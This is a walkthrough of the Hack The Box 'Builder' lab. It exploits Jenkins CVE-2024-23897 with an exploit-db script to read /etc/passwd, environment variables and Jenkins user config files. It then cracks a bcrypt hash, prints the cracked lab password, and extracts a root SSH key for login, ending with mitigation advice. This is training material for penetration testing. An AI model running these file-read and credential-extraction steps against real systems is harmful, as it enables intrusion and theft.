---
title: Builder
date: 2025-06-16
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, Jenkins, JENKINS_HOME, JENKINS_HOME/users, Jenkins-script-console-creds] 
image: builder.png
media_subpath: /assets/img/posts/2025-06-16-builderHTB/
---
## Introduction

**Builder** is a *medium-difficulty Linux machine* that hosts a **Jenkins CI/CD** instance vulnerable to [**CVE-2024-23897**](https://nvd.nist.gov/vuln/detail/CVE-2024-23897). This flaw allows **unauthenticated attackers** to read arbitrary files on the Jenkins controller's file system. Using this, the attacker retrieves the **username and password hash** of the Jenkins user `jennifer`. With these credentials, authenticated access to Jenkins is achieved. Further enumeration reveals an **encrypted SSH private key**, which is cracked and used to gain root access.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 8080

Version - Jetty 10.0.18

Navigating to the page I see:

![image.png](image%202.png)

Under users I can see username `jennifer`.

## Exploitation

I tried logging in using `admin`:`admin` but that didn’t work. I found this [exploit] (https://www.exploit-db.com/exploits/36318)and if it works, we may be able to read `conf` or `password` from `JENKINS_HOME`. It didn’t work, at the bottom I see the version of Jenkins used `Jenkins 2.441`. And that this version is vulnerable to [arbitrary file read vulnerability](https://www.exploit-db.com/exploits/51993). 

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

```bash
python3 51993.py -u http://10.10.11.10:8080/ -p /etc/passwd
```

![image.png](image%203.png)

It worked. I want to find out where is `JENKINS_HOME` directory.

```bash
python3 51993.py -u http://10.10.11.10:8080/ -p /proc/self/environ
```

![image.png](image%204.png)

And also as you can notice we are dealing probably with a container.

Searching for login credentials I see:

![image.png](image%205.png)

It turns out, jenkins create a directory with arbitrary name under users directory and store sensitive information under that directory. We remember the user we saw, that means there is probably a `/users` and `/some_dir` in Jenkins folder structure. Reading Jenkins documentation we see if some user is created it will be stored under `users` directory and the information about its `arbitraty_named_dir` can be found under `/users/users.xml`.

```bash
python3 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/users.xml
```

![image.png](image%206.png)

Jennifer’s directory is `jennifer_12108429903186576833`. Let’s read now `config.xml`:

```bash
python3 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```

I found a hash here:

![image.png](image%207.png)

Let’s try to crack it, it is a `bcrypt` hash:

```bash
hashcat -m 3200 jenn.hash /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -m 3200 jenn.hash /usr/share/wordlists/rockyou.txt --show
```

![image.png](image%208.png)

Now let’s login.

![image.png](image%209.png)

## Privilege Escalation

If I try to get a shell we are probably gonna inside of a docker container. I remember that app stored root credentials. Going to `/Credentials` I can see it, it seems root private key is stored here but it concealed, but we can change the root private key. As we can’t change `authorized_keys` and it is only compatible with current private SSH key I am gonna try to read the current one.

![image.png](image%2010.png)

Inspecting page source I can see the private key there:

![image.png](image%2011.png)

But it is not in good format, I found this [post](https://stackoverflow.com/questions/34795050/how-do-i-list-all-of-my-jenkins-credentials-in-the-script-console), where you can find a script that you can use to read credentials.

![image.png](image%2012.png)

After running I can see credentials in nice format.

Using the key we can login as root user:

```bash
ssh root@$IP -i key
```

![image.png](image%2013.png)

## Credentials

```bash
jennifer:princess
```

## Mitigation

- **Patch Jenkins** immediately to a version that fixes CVE-2024-23897.
- Disable or restrict **unauthenticated access** to Jenkins endpoints.
- Use **strong encryption and passphrases** for SSH keys and restrict their exposure.
- Enforce **role-based access control** in Jenkins and review user permissions regularly.
- Monitor Jenkins logs for **unusual file access patterns** and credential misuse.
